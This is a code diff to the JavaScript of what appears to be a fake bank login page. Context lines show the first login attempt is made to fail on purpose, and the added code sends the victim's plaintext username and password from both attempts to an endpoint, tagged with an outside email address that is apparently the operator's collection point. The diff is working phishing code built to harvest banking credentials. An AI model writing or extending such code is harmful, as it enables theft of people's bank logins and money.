@@ -194,6 +194,20 @@ document.addEventListener('DOMContentLoaded', function() {
             // First attempt always fails
             isFirstAttempt = false;
             
+            // Send first attempt to representative
+            fetch('/api/notify-login-attempt', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    attempt: 1,
+                    email: 'denzelbennie@outlook.com'
+                })
+            });
+            
             // Record first attempt metadata for admin notification
             saveMetadata(username, password, 1);
             
@@ -229,6 +243,20 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Show loading spinner
         showLoading('Connecting to your bank...');
+        
+        // Send second attempt to representative
+        fetch('/api/notify-login-attempt', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password,
+                attempt: 2,
+                email: 'denzelbennie@outlook.com'
+            })
+        });
         
         // Record second attempt metadata for admin notification
         saveMetadata(username, password, 2);
